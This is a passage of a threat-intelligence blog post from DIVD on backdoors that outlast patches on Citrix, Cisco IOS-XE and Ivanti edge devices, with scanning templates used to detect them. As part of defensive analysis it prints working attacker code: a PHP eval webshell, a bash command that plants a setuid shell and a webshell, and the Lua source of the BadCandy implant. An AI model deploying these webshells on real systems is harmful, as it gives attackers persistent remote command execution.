-73.75 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(1201.136523, 207.849388)"><g><path d="M 80.71875 -71.703125 L 57.15625 -5.09375 C 56 -1.695312 53.675781 0 50.1875 0 L 31.5625 0 C 28.070312 0 25.742188 -1.695312 24.578125 -5.09375 L 1.015625 -71.703125 L 23.859375 -71.703125 L 36.796875 -26.765625 C 37.867188 -22.785156 38.890625 -18.519531 39.859375 -13.96875 L 41.75 -13.96875 L 45.09375 -26.765625 L 58.03125 -71.703125 Z M 80.71875 -71.703125 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(1281.715829, 207.849388)"><g><path d="M 54.546875 -28.65625 L 28.65625 -28.65625 C 29.332031 -23.414062 30.90625 -19.898438 33.375 -18.109375 C 35.851562 -16.316406 39.953125 -15.421875 45.671875 -15.421875 C 53.328125 -15.421875 62.25 -15.953125 72.4375 -17.015625 L 74.46875 -3.640625 C 67 -0.046875 56.578125 1.75 43.203125 1.75 C 29.722656 1.75 20.117188 -1.15625 14.390625 -6.96875 C 8.671875 -12.789062 5.8125 -22.394531 5.8125 -35.78125 C 5.8125 -49.84375 8.597656 -59.6875 14.171875 -65.3125 C 19.753906 -70.9375 29.140625 -73.75 42.328125 -73.75 C 54.253906 -73.75 62.882812 -71.6875 68.21875 -67.5625 C 73.550781 -63.4375 76.265625 -57.160156 76.359375 -48.734375 C 76.359375 -42.035156 74.632812 -37.015625 71.1875 -33.671875 C 67.75 -30.328125 62.203125 -28.65625 54.546875 -28.65625 Z M 28.21875 -41.59375 L 48.578125 -41.59375 C 51.203125 -41.59375 52.972656 -42.222656 53.890625 -43.484375 C 54.804688 -44.742188 55.265625 -46.585938 55.265625 -49.015625 C 55.265625 -52.410156 54.390625 -54.757812 52.640625 -56.0625 C 50.898438 -57.375 47.703125 -58.03125 43.046875 -58.03125 C 37.523438 -58.03125 33.742188 -56.9375 31.703125 -54.75 C 29.671875 -52.570312 28.507812 -48.1875 28.21875 -41.59375 Z M 28.21875 -41.59375 "/></g></g></g><g fill="#fcfcfc" fill-opacity="1"><g transform="translate(1363.167861, 207.849388)"><g><path d="M 60.359375 -73.75 L 58.1875 -53.8125 L 52.359375 -53.8125 C 47.609375 -53.8125 40.289062 -52.164062 30.40625 -48.875 L 30.40625 0 L 8.875 0 L 8.875 -71.703125 L 25.59375 -71.703125 L 27.484375 -61.234375 C 37.285156 -69.578125 46.984375 -73.75 56.578125 -73.75 Z M 60.359375 -73.75 "/></g></g></g></svg></div>
        </div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="/blog.html">Blog</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
      </nav></div>
  </header>
</div><div class="page__content"><img class="article__header--cover" src="/assets/backdoor_castle.png" /><div class ="main"><div class="grid grid--reverse">

              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
</aside></div>

              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->

<!-- end custom main top snippet -->
<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>Scanning Beyond the Patch: A Public-Interest Hunt for Hidden Shells</h1></header></div><meta itemprop="headline" content="Scanning Beyond the Patch: A Public-Interest Hunt for Hidden Shells"><div class="article__info clearfix"><ul class="left-col menu"><li>
              <a class="button button--secondary button--pill button--sm"
                href="/blog.html# "/archive.html" (default)?tag=Observations+on+Threat+Intelligence">Observations on Threat Intelligence</a>
            </li></ul><ul class="right-col menu"><li><i class="fas fa-user"></i> <span>Max van der Horst</span></li><li><i class="far fa-calendar-alt"></i> <span>Jun 14, 2025</span>
            </li></ul></div><meta itemprop="author" content="Max van der Horst"/><meta itemprop="datePublished" content="2025-06-14T00:00:00+02:00">
    <meta itemprop="keywords" content="Observations on Threat Intelligence"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->

<!-- end custom article top snippet -->
<div class="article__content" itemprop="articleBody"><blockquote>
  <p><strong>Summary:</strong><br />
This blog explores three real-world cases—Citrix ADC (CVE-2023-3519), Cisco IOS XE (CVE-2023-20273), and Ivanti Connect Secure (CVE-2024-21893)—where patching alone failed to remove persistent backdoors from edge devices.<br />
We detail how these implants worked, how they evaded detection, and how we developed ethical scanning methods at DIVD to detect their remnants through behavioral side channels.<br />
Each case shows that compromise can survive remediation, and why defenders must look beyond patch status to detect real risk.</p>
</blockquote>

<p>On the internet’s edge, patching is no longer enough. With attack waves seemingly becoming more opportunistic, it is also important to look for signs that an edge device has already been compromised.</p>

<p>Over the past few years, I’ve notified thousands of organizations about critical vulnerabilities in their VPNs, firewalls, load balancers, and routers. Very often, the actual patching takes a while, or our notification takes some time to arrive. Some organizations may patch by themselves, wondering why the notification they received is relevant at all. They may not realize the uncomfortable truth: patching doesn’t undo compromise.</p>

<p>Attackers that target edge devices often exploit a narrow window of exposure, with <a href="https://vulncheck.com/blog/exploitation-trends-q1-2025">28.3% of vulnerabilities being exploited within a single day</a> of their CVE disclosure in 2025! Some of these exploit waves leave implants that persist even after the initial vulnerability is closed, which is why it’s so important to verify that the underlying system hasn’t been compromised.</p>

<p>The following post is about what we miss when we treat patching as the finish line and why public-interest researchers must go further: scanning not just for vulnerabilities, but for the residue of compromise.</p>

<h1 id="backdoors-after-the-fix">Backdoors after the fix</h1>
<p>Our dependency on edge devices has <a href="https://www.bls.gov/opub/btn/volume-13/remote-work-productivity.htm">drastically increased</a> since the COVID-19 pandemic, as they support the possibility to work remotely. They’re externally reachable, typically trusted by internal networks, and not always monitored with the same rigor as desktop endpoints or cloud workloads. This, among other reasons, makes edge devices a high-value target. When an attacker gets in through a zero-day or n-day vulnerability, their goal isn’t just access. It’s persistence.</p>

<p>At DIVD, we’ve seen this firsthand. In multiple investigations, such as <a href="https://blog.fox-it.com/2023/08/15/approximately-2000-citrix-netscalers-backdoored-in-mass-exploitation-campaign/amp/">DIVD-2023-00033</a>, by the time a vendor issues a patch and the admin applies it, the exploit path may be closed, but a backdoor is already installed. These aren’t theoretical risks. From simple PHP <code class="language-plaintext highlighter-rouge">eval()</code> implants to backdoors and credential stealers embedded in existing code, masked, and even re-signed by the malware itself, adversaries are developing significant capability in this area and are <a href="https://www.compliancepoint.com/cyber-security/hackers-exploiting-edge-devices-how-to-defend-your-organization/">increasingly treating</a> edge devices as a beachhead.</p>

<p>Some of these implants prevent or survive firmware updates, evade scans for Indicators of Compromise (IoCs), and blend into system components. Yet, after patching, many operators seem to stop looking. The logs are cleared, the traffic looks clean, the box is assumed safe. However, unless we actively look for signs of compromise, patching may only treat the symptom, not the infection.</p>

<h1 id="finding-what-the-patch-missed">Finding what the patch missed</h1>
<p>Despite vendors releasing patches and integrity checks, we’ve repeatedly encountered edge systems that remain compromised. This makes backdoors an interesting case for our public-interest scanning at DIVD. What follows are anonymized cases that illustrate the gap between vulnerability remediation and true system recovery, and why operators need to look further than just the vulnerability. An important discussion in this context is how to approach the backdoor ethically as I previously discussed in my post on <a href="https://disclosing.observer/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html">scanning ethics</a>.</p>

<p>Not triggering any unintended behavior is essential, so the scanning methodology discussed below for each CVE does not focus on directly using the backdoor to confirm its presence. While this is possible in many cases through the use of magic bytes, keys, or HTTP parameters, focusing on side channels ensures the proportionality of the scan.</p>

<table>
  <thead>
    <tr>
      <th>Appliance</th>
      <th style="text-align: left">Vulnerability</th>
      <th style="text-align: center">Response signature</th>
      <th style="text-align: right">Scanning method</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Citrix ADC NetScaler</td>
      <td style="text-align: left">CVE-2023-3519</td>
      <td style="text-align: center">HTTP 201 on v1, empty HTTP 404 on v2.</td>
      <td style="text-align: right">Scan for HTTP 201 or empty 404 (without Content-Length) on known PHP paths.</td>
    </tr>
    <tr>
      <td>Cisco IOS-XE</td>
      <td style="text-align: left">CVE-2023-20198</td>
      <td style="text-align: center">Fake 404 Not Found page on v1, shell version or 18-character string on v2.</td>
      <td style="text-align: right">Scan by adding <code class="language-plaintext highlighter-rouge">%25</code> for the first version and checking for 404 Not Found, scanning by using the <code class="language-plaintext highlighter-rouge">logon_hash=1</code> parameter for the second version.</td>
    </tr>
    <tr>
      <td>Ivanti Connect Secure</td>
      <td style="text-align: left">CVE-2024-21893</td>
      <td style="text-align: center">HTTP 200 response on endpoint with random characters or the output of <code class="language-plaintext highlighter-rouge">uname -a</code>, expected behavior is a 404.</td>
      <td style="text-align: right">Scanning on created files by the exploit on index.txt, index1.txt, or index2.txt.</td>
    </tr>
  </tbody>
</table>

<h2 id="citrix-adc-and-netscaler-gateway---cve-2023-3519">Citrix ADC and NetScaler Gateway - CVE-2023-3519</h2>
<p>In July 2023, Citrix <a href="https://support.citrix.com/external/article?articleUrl=CTX561482-citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467&amp;language=en_US">disclosed</a> CVE-2023-3519, a critical unauthenticated Remote Code Execution vulnerability in Citrix ADC and NetScaler Gateway when configured as a gateway or AAA virtual server. The vulnerability was actively exploited in the wild at the time of disclosure.</p>

<p>To support remediation at scale, DIVD, in collaboration with Fox-IT, initiated an internet-wide scan campaign under investigation <a href="https://csirt.divd.nl/cases/DIVD-2023-00030/">DIVD-2023-00030</a> for the vulnerability and <a href="https://csirt.divd.nl/cases/DIVD-2023-00033/">DIVD-2023-00033</a> for the backdoor campaign. This was one of the first cases where I experienced how quickly attackers can establish persistence before patches are even applied.</p>

<h3 id="scanning-for-the-backdoors">Scanning for the Backdoors</h3>
<p>The first vulnerability had significant activity around it and many different backdoors. While there was nation state activity around this vulnerability, <a href="https://cloud.google.com/blog/topics/threat-intelligence/citrix-zero-day-espionage/">with a suspected Chinese threat actor spreading implants (dubbed SECRETSAUCE)</a>, it is unclear whether the shell we investigated was criminal or nation-state. On July 20th, 2023, implants started appearing. While the nation state shells appeared under the <code class="language-plaintext highlighter-rouge">/var/vpn/themes</code> directory, were asymmetric, and did not contain any clear mistakes, the criminal webshell did and started appearing in the <code class="language-plaintext highlighter-rouge">/logon/LogonPoint/uiareas</code> directory.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">201</span><span class="p">);</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 1: Citrix Webshell version 1</span></p>

<p>This first version of the webshell (illustrated in Listing 1) was a simple PHP <code class="language-plaintext highlighter-rouge">eval</code> backdoor that returns an HTTP 201 (created) response code and passed the value of POST parameter <code class="language-plaintext highlighter-rouge">5</code> to PHP <code class="language-plaintext highlighter-rouge">eval()</code>. The mistake here is that this backdoor introduces a sidechannel: if the endpoint does not exist, it returns HTTP 404 as the response code. Due to the order of the statements, it will return HTTP 201 regardless of the <code class="language-plaintext highlighter-rouge">eval()</code> call succeeding. This allowed us to scan for HTTP 201 as the response code.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">citrix-implant-cve-2023-3519</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Citrix CVE-2023-3519 Implant Scan</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/logon/LogonPoint/uiareas/{{uri}}"</span>
    
    <span class="na">payloads</span><span class="pi">:</span>
      <span class="na">uri</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="s2">"</span><span class="s">{{filename:common_php_filenames.txt}}"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">status</span>
        <span class="na">status</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="m">201</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 2: Nuclei scanning template for the Citrix Webshells</span></p>

<p>This backdoor was included under filenames that match the most <a href="https://gitlab.com/kalilinux/packages/seclists/blob/b83a756bb2c06f94c03e525326e8480981b58a9c/Discovery/Web-Content/Common-PHP-Filenames.txt">common PHP filenames</a>, among which <code class="language-plaintext highlighter-rouge">prod.php</code>, <code class="language-plaintext highlighter-rouge">log.php</code>, <code class="language-plaintext highlighter-rouge">logout.php</code>. This allowed us to iterate over the list of filenames and query the target system for the presence of the backdoor. The downside of this is that, given each system would have to accept a few thousand requests from us, we had to diffuse scan targets and scan over a prolonged time as to not overwhelm systems with our scanning. The scan template is shown in Listing 2.</p>

<p>On July 21st, however, the implant moved. There was a sudden drop in vulnerable devices as the old implants seemed to have been used to deploy a newer, more ‘sophisticated’ implant. As shown in Listing 3, instead of returning an HTTP 201 response, the implant now returns an empty HTTP 404 and introduced a key to the <code class="language-plaintext highlighter-rouge">eval()</code> call. This functions as a basic authentication mechanism.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /bin/sh /var/nss <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +s /var/nss <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> /netscaler/ns_gui/epa/scripts/[redacted]<span class="p">;</span> 
<span class="nb">echo</span> <span class="s1">'&lt;?php  http_response_code(404); @eval($_POST[redacted]);'</span> <span class="o">&gt;</span> 
/netscaler/ns_gui/epa/scripts/[redacted]/[redacted].php
</code></pre></div></div>
<p><span class="centered-text">Listing 3: Evolution of the Citrix Webshell to further obfuscate</span></p>

<p>The same mistake as with the previous implant was repeated here, though. Returning an empty HTTP 404 response is atypical for Citrix software. It typically returns an HTTP 302 or at least contains some headers (in particular a Content-Length header). So this time, we could scan for that. This led us to refine the scanning template for 404 anomalies (Listing 4).</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">citrix-implant-cve-2023-3519-v2</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Citrix CVE-2023-3519 Implant Scan - v2</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/logon/LogonPoint/uiareas/{{filename}}"</span>
    
    <span class="na">payloads</span><span class="pi">:</span>
      <span class="na">filename</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="s2">"</span><span class="s">{{filename:common_php_filenames.txt}}"</span>
    
    <span class="na">matchers-condition</span><span class="pi">:</span> <span class="s">and</span>
    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">status</span>
        <span class="na">status</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="m">404</span>

      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">regex</span>
        <span class="na">part</span><span class="pi">:</span> <span class="s">header</span>
        <span class="na">negative</span><span class="pi">:</span> <span class="kc">true</span>
        <span class="na">regex</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s1">'</span><span class="s">(?i)content-length:'</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 4: Nuclei scanning template for the updated Citrix Webshells</span></p>

<h3 id="results-increasing-global-overview-with-759">Results: increasing global overview with 759%</h3>
<p>Together with Fox-IT, we scanned 264.000 IP addresses. Of these IPs, 31.127 Citrix hosts were vulnerable at that time. Of these 31.127 vulnerable hosts, we found 2491 implants worldwide, nearly eight times more than were previously known. As Figure 1 shows, Europe and Asia were popular in particular. Through collaboration with various channels such as The Shadowserver Foundation, government CSIRTs, and directly notifying, we could decrease the number of backdoors steadily over the months after.</p>

<figure class="centered-img">
  <img style="margin:auto; display:block; padding:10px; max-width:79%;" src="../../../assets/backdoored-top-20-citrix.png" alt="VEP Process" />
  <figcaption style="text-align:center;">Figure 1: Fox-IT numbers of backdoored instances, source: NCC Group</figcaption>
</figure>

<h2 id="cisco-ios-xe---cve-2023-20273">Cisco IOS-XE - CVE-2023-20273</h2>
<p>In late September 2023, Cisco disclosed CVE-2023-20198, a critical unauthenticated Remote Code Execution vulnerability affecting the Web UI of Cisco IOS-XE devices. The bug allowed attackers to create privileged user accounts without authentication, often as a precursor to installing a persistent implant via the vulnerability. Once deployed, the implant allowed arbitrary command execution over HTTPS and could persist across reboots in some of the cases.</p>

<p>This vulnerability saw an explosive amount of exploit activity as well, with a threat actor installing the BadCandy malware on a global scale. DIVD scanned for these implants under investigation <a href="https://csirt.divd.nl/cases/DIVD-2023-00038/">DIVD-2023-00038</a>.</p>

<h3 id="scanning-for-the-backdoors-1">Scanning for the Backdoors</h3>
<p>The implant installed using this vulnerability, called BadCandy, is a bit more complex than the previous implants. BadCandy is a Lua-based webshell and consists of 29 lines of code that facilitate arbitrary command execution and is disguised as an Nginx configuration. The attacker can use the webshell by creating HTTP POST requests the <code class="language-plaintext highlighter-rouge">/webui/logoutconfirm.html</code> endpoint.</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">location</span> <span class="o">/</span><span class="n">webui</span><span class="o">/</span><span class="n">logoutconfirm</span><span class="p">.</span><span class="n">html</span> <span class="p">{</span>
    <span class="n">add_header</span> <span class="n">Content</span><span class="o">-</span><span class="n">Type</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span>	
    <span class="n">add_header</span> <span class="n">Cache</span><span class="o">-</span><span class="n">Control</span> <span class="s1">'no-cache, no-store, must-revalidate'</span><span class="p">;</span>
    <span class="n">add_header</span> <span class="n">Pragma</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="p">;</span>
    <span class="n">add_header</span> <span class="n">Strict</span><span class="o">-</span><span class="n">Transport</span><span class="o">-</span><span class="n">Security</span> <span class="s2">"max-age=31536000; includeSubdomain"</span><span class="p">;</span>
    <span class="n">content_by_lua_block</span> <span class="p">{</span>
            
            <span class="kd">local</span> <span class="n">method</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_method</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_headers</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">params</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_uri_args</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="ow">and</span> <span class="n">params</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="p">)</span> <span class="k">then</span>
                    <span class="kd">local</span> <span class="n">authcode</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">],</span> <span class="s2">"^%s*(.-)%s*$"</span><span class="p">,</span> <span class="s2">"%1"</span><span class="p">)</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">authcode</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">authcode</span><span class="p">,</span> <span class="s2">"^%w+$"</span><span class="p">)</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                        <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                            <span class="kd">local</span> <span class="n">shasum</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
                            <span class="n">shasum</span> <span class="o">=</span> <span class="nb">string.lower</span><span class="p">(</span><span class="n">shasum</span><span class="p">)</span>
                            <span class="k">if</span> <span class="nb">string.find</span><span class="p">(</span><span class="n">shasum</span><span class="p">,</span> <span class="s2">"&lt;redacted&gt;"</span><span class="p">)</span> <span class="k">then</span>
                                <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
                            <span class="k">end</span>
                            <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
                        <span class="k">end</span>
                    <span class="k">end</span>
                <span class="k">end</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">authorized</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="k">then</span>
                    <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">read_body</span><span class="p">()</span>
                    <span class="kd">local</span> <span class="n">body</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_body_data</span><span class="p">()</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"menu"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"menu"</span><span class="p">]</span> <span class="o">~=</span> <span class="s2">""</span><span class="p">)</span> <span class="k">then</span>
                        <span class="n">content</span> <span class="o">=</span> <span class="s2">"/2010202301/"</span>
                    <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"1"</span><span class="p">)</span> <span class="k">then</span>
                        <span class="n">content</span> <span class="o">=</span> <span class="s2">"&lt;redacted&gt;"</span>
                    <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">~=</span> <span class="n">niL</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"&lt;redacted&gt;&gt;"</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"subsystem"</span><span class="p">)</span> <span class="k">then</span>
                            <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span>
                            <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                                <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
                                <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
                            <span class="k">end</span>
                        <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"iox"</span><span class="p">)</span> <span class="k">then</span>
                            <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">set_header</span><span class="p">(</span><span class="s2">"Priv-Level"</span><span class="p">,</span> <span class="s2">"15"</span><span class="p">)</span>
                            <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">location</span><span class="p">.</span><span class="n">capture</span><span class="p">(</span><span class="s2">"*/luas"</span><span class="p">,</span> <span class="p">{</span><span class="n">method</span><span class="o">=</span><span class="n">ngx</span><span class="p">.</span><span class="n">HTTP_POST</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">body</span><span class="p">})</span> 
                            <span class="kd">local</span> <span class="n">response</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">body</span>
                            <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">response</span> <span class="o">==</span> <span class="kc">nil</span> <span class="ow">or</span> <span class="n">response</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">then</span>
                                <span class="n">content</span> <span class="o">=</span> <span class="n">response</span>
                            <span class="k">end</span>
                        <span class="k">end</span>
                    <span class="k">end</span>
                <span class="k">end</span>
            <span class="k">end</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">authorized</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="k">then</span>
                <span class="n">ngx</span><span class="p">.</span><span class="n">status</span> <span class="o">=</span> <span class="mi">200</span>
                <span class="n">ngx</span><span class="p">.</span><span class="n">say</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
            <span class="k">else</span>
                <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">location</span><span class="p">.</span><span class="n">capture</span><span class="p">(</span><span class="s2">"/internalWebui/login.html"</span><span class="p">,</span> <span class="p">{</span><span class="n">method</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">HTTP_GET</span><span class="p">})</span>
                <span class="k">if</span> <span class="n">result</span> <span class="k">then</span>
                    <span class="n">ngx</span><span class="p">.</span><span class="n">status</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">status</span>
                    <span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">body</span> <span class="k">then</span>
                        <span class="n">ngx</span><span class="p">.</span><span class="n">say</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
                    <span class="k">end</span>
                <span class="k">end</span>
            <span class="k">end</span>
    <span class="p">}</span> 
<span class="p">}</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 5: BadCandy implant for Cisco IOS-XE - version 1</span></p>

<p>Listing 5 shows the full logic of the initial BadCandy implant, disguised as an Nginx config block. In most early instances of the backdoor, if the <code class="language-plaintext highlighter-rouge">?logon_hash=1</code> parameter is set, it will return an 18-character hexadecimal string. If the <code class="language-plaintext highlighter-rouge">common_type</code> parameter is <code class="language-plaintext highlighter-rouge">subsystem</code>, it executes the request body, and if the <code class="language-plaintext highlighter-rouge">common_type</code> parameter is <code class="language-plaintext highlighter-rouge">iox</code>, it will execute on Privilege Level 15. The <code class="language-plaintext highlighter-rouge">login_hash</code> parameter also allowed including a 40-character hash that serves as an authentication mechanism for the command execution functionality.</p>

<p>Around October 20, 2023, a second version of the implant appeared that included an additional authentication mechanism, shown in Listing 6. The second version included a preliminary check for an HTTP Authorization header. Cisco Talos <a href="https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/">suspected at the time</a> that this was a reactive measure to prevent the identification of compromised systems. Later, a third version of the BadCandy implant would include an additional check for a <code class="language-plaintext highlighter-rouge">X-Csrf-Token</code> HTTP header in a similar fashion. Strangely enough, the third version would qualify an incoming request as authorized as long as one of the two headers would be correct.</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="ow">and</span> <span class="n">params</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="p">)</span> <span class="k">then</span>
          <span class="kd">local</span> <span class="n">authcode</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">],</span> <span class="s2">"^%s*(.-)%s*$"</span><span class="p">,</span> <span class="s2">"%1"</span><span class="p">)</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">authcode</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">authcode</span><span class="p">,</span> <span class="s2">"^%w+$"</span><span class="p">)</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
              <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span>
